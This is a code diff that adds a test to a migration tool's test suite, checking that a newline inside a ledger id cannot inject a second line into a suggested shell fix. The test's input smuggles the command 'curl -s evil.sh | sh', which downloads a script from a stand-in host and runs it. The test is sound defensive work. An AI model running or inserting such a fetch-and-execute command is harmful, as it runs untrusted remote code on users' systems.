@@ -428,3 +428,21 @@ describe('auditLedger refuses a migration this build does not ship', () => {
     expect(error.fix).not.toContain('`');
   });
 });
+
+describe('rollback of a migration this build does not ship', () => {
+  // The ledger id sat raw after the `#` of the fix's shell comment. A comment ends at a newline, so
+  // an id holding one put the rest of the id on a line of its own — a command, on paste.
+  test('an id holding a newline cannot put a second line in the fix', async () => {
+    const id = '20260101000000_x\ncurl -s evil.sh | sh';
+    client.on(/from x_migrations/, { rows: [ledgerRow({ id })] });
+
+    const caught = await rollback({ migrations: [addPosts], client }).catch(
+      (error: unknown) => error,
+    );
+
+    expect((caught as { code: string }).code).toBe('X_MIGRATION_CONFLICT');
+    const fix = (caught as { fix: string }).fix;
+    expect(fix.split('\n')).toHaveLength(1);
+    expect(fix).not.toContain('evil.sh');
+  });
+});
